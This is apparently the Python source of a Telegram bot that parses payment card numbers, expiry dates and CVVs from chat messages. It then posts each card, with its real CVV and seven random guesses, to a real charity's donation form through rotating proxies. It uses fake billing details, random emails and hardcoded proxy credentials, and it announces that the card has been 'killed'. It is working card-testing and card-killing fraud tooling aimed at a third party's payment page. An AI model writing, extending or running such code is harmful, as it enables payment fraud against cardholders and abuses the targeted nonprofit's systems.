import requests
import re
import unicodedata
import random
import time
import string
import logging
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple
from bs4 import BeautifulSoup, SoupStrainer
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('killer.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

proxy_credentials = [
    'tnapkbnn-rotate:8vsviipgym5g',
]
proxy_base = 'p.webshare.io:80'

proxies_list = [
    {
        'http': f'http://{cred}@{proxy_base}/',
        'https': f'http://{cred}@{proxy_base}/'
    } for cred in proxy_credentials
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
]

def get_random_user_agent() -> str:
    return random.choice(USER_AGENTS)

def generate_random_email() -> str:
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(('gmail.com', 'yahoo.com', 'outlook.com'))
    return f"{username}@{domain}"

# ----------------------------------------------------------------------
# ★ FIXED: UNIVERSAL CARD PARSER
# ----------------------------------------------------------------------
def extract_card_data(raw: str):
    import re, unicodedata

    # 1. Normalize (important for Telegram and weird unicode)
    text = unicodedata.normalize("NFKC", raw or "")

    # 2. Remove ALL zero-width and invisible chars Telegram injects
    text = re.sub(r'[\u200B\u200C\u200D\u2060\uFEFF\u180E]', '', text)

    # 3. Flatten newlines and normalize spaces
    text = text.replace("\n", " ").replace("\r", " ")
    text = re.sub(r'\s+', ' ', text).strip()

    lowered = text.lower()

    # -------------------------
    # CARD NUMBER: detect groups with spaces/dashes
    # Find candidate chunks containing digits, spaces, or dashes then strip non-digits
    # and accept the first candidate with 13-19 digits (prefer 16-19 if available)
    # -------------------------
    candidates = re.findall(r'[\d\s\-]{13,40}', text)
    card_number = None
    best_len = 0
    for cand in candidates:
        digits = re.sub(r'\D', '', cand)
        if 13 <= len(digits) <= 19:
            # prefer longer (more likely actual card)
            if len(digits) > best_len:
                card_number = digits
                best_len = len(digits)

    if not card_number:
        # final fallback: any contiguous 13-19 digit sequence
        m = re.search(r'\b\d{13,19}\b', text)
        if m:
            card_number = m.group(0)

    if not card_number:
        raise ValueError('Card not found')

    cc = card_number

    # -------------------------
    # EXPIRY: look for MM/YY, MM/YYYY, M/YYYY, separators may be / - . or unicode fraction
    # Accept patterns like 'exp: 06/29' or '06-2029' or '06 29'
    # -------------------------
    expiry = None
    # try explicit forms with separator
    # include pipe '|' as a valid separator as well
    # prefer explicit symbol separators (/, |, -, .). Do NOT treat plain whitespace as a separator
    # because that causes false matches inside spaced card numbers.
    expiry_match = re.search(r'(?:exp(?:iry|iration)?[:\s]*)?(0?[1-9]|1[0-2])\s*(?:/|-|\.|\u2044|\|)\s*(\d{2,4})', lowered)
    if expiry_match:
        mm = expiry_match.group(1).zfill(2)
        yy = expiry_match.group(2)
        # normalize 4-digit year to 2-digit
        if len(yy) == 4:
            yy = yy[-2:]
    else:
        # extra explicit check for common separators in the original text (preserve original spacing)
        sep_match = re.search(r'(0?[1-9]|1[0-2])\s*(?:/|\|)\s*(\d{2,4})', text)
        if sep_match:
            mm = sep_match.group(1).zfill(2)
            yy = sep_match.group(2)
            if len(yy) == 4:
                yy = yy[-2:]
        else:
            # try compact MMYY like 0629 or MYY (contiguous digits)
            m2 = re.search(r'\b(0[1-9]|1[0-2])([0-9]{2})\b', lowered)
            if m2:
                mm = m2.group(1).zfill(2)
                yy = m2.group(2)
            else:
                raise ValueError('Expiry not found')

    # -------------------------
    # CVV: prefer labeled forms (cvv/cvc/security code). If not found, pick a 3-4 digit
    # group that is not the year and not part of the card number.
    # -------------------------
    cvv = None
    labeled = re.search(r'(?:cvv|cvc|security code|sec code|scode)[:\s\-]*?(\d{3,4})', lowered)
    if labeled:
        cvv = labeled.group(1)
    else:
        # find standalone 3-4 digit numbers
        for m in re.findall(r'\b\d{3,4}\b', text):
            if m in cc:
                continue
            if m == yy or m == mm:
                continue
            # skip common short years like 2023 (4 digits) if they look like full year and match yyyy
            if len(m) == 4 and m.startswith('20'):
                continue
            cvv = m
            break

    if not cvv:
        raise ValueError('CVV not found')

    return cc, mm, yy, cvv



# ----------------------------------------------------------------------
# ★ FIXED: Return cookies properly
# ----------------------------------------------------------------------
def get_fresh_cookies(proxy: dict) -> dict:
    try:
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'user-agent': get_random_user_agent(),
        }
        response = requests.get(
            'https://aasr-indy.org/philanthropy/donate/',
            headers=headers,
            proxies=proxy,
            timeout=5
        )
        return response.cookies.get_dict()   # <-- FIXED
    except Exception as e:
        logger.error(f"Failed to fetch cookies: {str(e)}")
        return {}

# ----------------------------------------------------------------------
def process_cvv(card_info: str, cvv: str, proxy: dict) -> str:
    cc, mm, yy, _ = card_info.split('|')

    with requests.Session() as session:
        cookies = get_fresh_cookies(proxy)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'user-agent': get_random_user_agent(),
        }

        data = {
            'amount': '20',
            'direct_to': 'Cathedral Foundation',
            'type': 'General',
            'memory_of': 'Elizabeth Queen',
            'credit_card': 'Visa',
            'credit_card_number': cc,
            'expiration_month': mm,
            'expiration_year': f"20{yy}",
            'cvv': cvv,
            'billing_first_name': 'Mohammed',
            'billing_last_name': 'Nehal',
            'billing_address': 'New York',
            'billing_city': 'New York',
            'billing_state': 'New York',
            'billing_postal_code': '10040',
            'billing_country': 'United States',
            'billing_telephone': '07975102052',
            'billing_email': generate_random_email(),
            'submit': '1',
            'debug': '1',
        }

        try:
            response = session.post(
                'https://aasr-indy.org/philanthropy/donate/',
                headers=headers,
                data=data,
                cookies=cookies,
                proxies=proxy,
                timeout=5
            )

            match = re.search(r'<p\s+class="attention">\s*(.*?)\s*</p>', response.text)
            msg = match.group(1) if match else "No message"

            logger.info(f"CVV {cvv}: {msg}")
            return f"{cvv} - {msg}"

        except Exception as e:
            logger.error(f"Error for CVV {cvv}: {str(e)}")
            return f"{cvv} - Error: {str(e)}"

# ----------------------------------------------------------------------
async def ded(client: TelegramClient, event: events.NewMessage.Event, card_info: str):
    try:
        normalized = parse_card_input(card_info)
    except ValueError as e:
        await event.reply(f"❌ Error: {str(e)}\nSend full card, expiry and cvv in any format.")
        return

    cc, mm, yy, real_cvv = normalized.split('|')

    processing_msg = await event.reply("𝑲𝒊𝒍𝒍𝒊𝒏𝒈 𝒚𝒐𝒖𝒓 𝒄𝒂𝒓𝒅... 💀")

    start_time = time.time()

    cvvs = [real_cvv] + [f"{random.randint(0,999):03d}" for _ in range(7)]

    with ThreadPoolExecutor(max_workers=8) as executor:
        proxy_cycle = proxies_list * (len(cvvs) // len(proxies_list) + 1)
        results = list(
            executor.map(
                lambda c, p: process_cvv(normalized, c, p),
                cvvs,
                proxy_cycle[:len(cvvs)]
            )
        )

    total_time = time.time() - start_time

    msg = "☠️ 𝑲𝒊𝒍𝒍𝒆𝒅 𝒔𝒖𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚\n"

    for r in results:
        msg += r + "\n"

    msg += f"\n⏱ Time Taken: {total_time:.2f}s"

    await processing_msg.edit(msg)


def parse_card_input(raw: str) -> str:
    """
    Normalize a card input into the form: cc|mm|yy|cvv

    Accepts either:
      - an already-piped string like '4111111111111111|06|29|123'
      - a raw block of text containing number, expiry and cvv in any order

    Raises ValueError if any component is missing or invalid.
    """
    raw = (raw or "").strip()

    # If user already sent the normalized pipe format, validate quickly.
    # Only accept this branch when the entire input is exactly the pipe-delimited form
    # (prevents mistaking inline '06|2029' as the full shorthand).
    piped_full_match = re.match(r'^\s*(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2})\s*\|\s*(\d{3,4})\s*$', raw)
    if piped_full_match:
        cc = piped_full_match.group(1)
        mm = piped_full_match.group(2).zfill(2)
        yy = piped_full_match.group(3)
        cvv = piped_full_match.group(4)
        # basic validations already enforced by regex
        return f"{cc}|{mm}|{yy}|{cvv}"

    # Otherwise try to extract from free text
    try:
        cc, mm, yy, cvv = extract_card_data(raw)
    except Exception as e:
        raise ValueError(str(e))

    # Normalize month/year to two-digit year
    mm = mm.zfill(2)
    yy = yy.zfill(2)

    return f"{cc}|{mm}|{yy}|{cvv}"


def extract_cc_mm_yyyy(raw: str) -> Tuple[str, str, str]:
    """
    Extract card number, month (MM) and year (YYYY) from messy/free-form input.

    Returns (cc, mm, yyyy) where yyyy is 4-digit year. Raises ValueError if card or
    expiry cannot be found.
    """
    # reuse normalization logic
    s = unicodedata.normalize("NFKC", raw or "")
    s = re.sub(r'[\u200B\u200C\u200D\u2060\uFEFF\u180E]', '', s)
    s = s.replace("\n", " ").replace("\r", " ")
    s = re.sub(r'\s+', ' ', s).strip()
    lowered = s.lower()

    # CARD: accept digits possibly separated by spaces, dashes, dots, mid-dots, bullets, non-breaking spaces
    card_pat = re.search(r'(?:\d[ \-\.\u00B7\u2022\u00A0]*){13,19}', s)
    card_number = None
    if card_pat:
        card_number = re.sub(r'\D', '', card_pat.group(0))
    else:
        # fallback contiguous digits
        m = re.search(r'\b\d{13,19}\b', s)
        if m:
            card_number = m.group(0)

    if not card_number:
        raise ValueError('Card not found')

    cc = card_number

    # EXPIRY: 3-step approach
    # 1) labeled expiry (allows whitespace as separator)
    labeled = re.search(r'(?:exp(?:iry|ired)?)[^\d]{0,12}(0?[1-9]|1[0-2])\s*(?:/|\||-|\.|\s)\s*(\d{2,4})', lowered)
    if labeled:
        mm = labeled.group(1).zfill(2)
        yy = labeled.group(2)
    else:
        # 2) explicit separator (/,|,-,.) without relying on whitespace
        explicit = re.search(r'(0?[1-9]|1[0-2])\s*(?:/|\||-|\.)\s*(\d{2,4})', s)
        if explicit:
            mm = explicit.group(1).zfill(2)
            yy = explicit.group(2)
        else:
            # 3) compact MMYY contiguous
            compact = re.search(r'\b(0[1-9]|1[0-2])([0-9]{2})\b', lowered)
            if compact:
                mm = compact.group(1).zfill(2)
                yy = compact.group(2)
            else:
                raise ValueError('Expiry not found')

    # normalize year to 4-digit
    if len(yy) == 2:
        # naive pivot: 00-79 -> 2000-2079, 80-99 -> 1980-1999 (adjustable)
        y = int(yy)
        if 0 <= y <= 79:
            yyyy = f"20{yy}"
        else:
            yyyy = f"19{yy}"
    else:
        yyyy = yy

    return cc, mm.zfill(2), yyyy





